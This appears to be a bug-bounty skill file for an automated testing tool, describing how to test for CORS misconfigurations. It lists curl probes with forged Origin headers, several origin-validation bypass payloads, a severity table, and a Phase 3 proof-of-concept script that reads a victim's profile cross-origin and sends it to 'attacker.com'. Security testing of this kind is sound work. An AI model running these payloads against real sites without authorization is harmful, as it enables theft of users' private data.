---
name: attack-cors
description: "CORS misconfiguration testing — origin reflection, wildcard bypass, null origin, credential leakage"
category: "web-application"
version: "1.0"
author: "bountyreper-official"
tags:
  - cors
  - web
  - owasp
  - access-control
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-942
  - CWE-346
chains_with:
  - attack-open-redirect
  - attack-idor-automation
prerequisites: []
severity_boost:
  attack-open-redirect: "CORS + open redirect = token theft via cross-origin request"
---

# CORS Misconfiguration Attack

## Objective

Identify Cross-Origin Resource Sharing misconfigurations that allow unauthorized cross-origin access to sensitive data or APIs.

## Testing Methodology

### Phase 1: Origin Reflection Detection

Test if the server reflects arbitrary origins in `Access-Control-Allow-Origin`:

```bash
# Automated CORS checker (bundled script)
attack_script cors_checker https://TARGET/api/endpoint --json-output
```

Manual tests:

```bash
# Arbitrary origin
curl -s -H "Origin: https://evil.com" TARGET_URL -D- | grep -i "access-control"

# Subdomain bypass
curl -s -H "Origin: https://TARGET.evil.com" TARGET_URL -D-

# Null origin
curl -s -H "Origin: null" TARGET_URL -D-

# HTTP downgrade
curl -s -H "Origin: http://TARGET" TARGET_URL -D-
```

### Phase 2: Bypass Techniques

```bash
# Backtick bypass
curl -s -H "Origin: https://TARGET%60.evil.com" TARGET_URL -D-

# Underscore bypass
curl -s -H "Origin: https://TARGET_.evil.com" TARGET_URL -D-

# CRLF injection
curl -s -H "Origin: https://evil.com%0d%0a" TARGET_URL -D-

# Prefix matching bypass
curl -s -H "Origin: https://evil-TARGET" TARGET_URL -D-
```

### Phase 3: Impact Verification

If ACAO reflects attacker origin + ACAC is true:

```html
<!-- PoC: reads victim data cross-origin -->
<script>
fetch('https://TARGET/api/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(d => fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(d))))
</script>
```

## What Constitutes a Finding

| Condition | Severity |
|-----------|----------|
| Arbitrary origin reflected + credentials allowed | Critical (P1) |
| Arbitrary origin reflected, no credentials | Medium (P3) |
| null origin accepted + credentials allowed | High (P2) |
| Subdomain origin reflected + credentials | High (P2) |
| Wildcard ACAO with credentials | Medium (P3) |

## Evidence Requirements

- Request with attacker `Origin` header
- Response showing `Access-Control-Allow-Origin` reflection
- Response showing `Access-Control-Allow-Credentials: true`
- PoC HTML demonstrating cross-origin data access

## Tools

- `attack_script cors_checker` — automated multi-origin testing
- `curl` — manual header injection
- Browser DevTools — verify CORS behavior

## HowToHunt Advanced Supplement

> **Source:** [KathanP19/HowToHunt — CORS_Bypasses](https://github.com/KathanP19/HowToHunt/tree/master/CORS) by tamimhasan404. Additional bypass payloads not covered above.

**Extra bypass vectors to test when standard reflection fails:**

```bash
# Encoded dot bypass
curl -H "Origin: https://attacker%target.com" https://target.com/api -D-
# Method flip bypass (GET→POST, POST→GET)
curl -H "Origin: https://attacker.com" -X POST https://target.com/api -D-
# Path-trailing bypass
curl -H "Origin: https://attacker.com/target.com" https://target.com/api -D-
# Subdomain with underscore/dot tricks already covered, also try:
curl -H "Origin: https://sub.attacker%20target.com" https://target.com/api -D-
```

These succeed when server does naive `contains(target.com)` or `endsWith` checks without proper Origin parsing. Always verify with `Access-Control-Allow-Credentials: true` for impact.

## References

- [PortSwigger: CORS](https://portswigger.net/web-security/cors)
- [OWASP: CORS Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
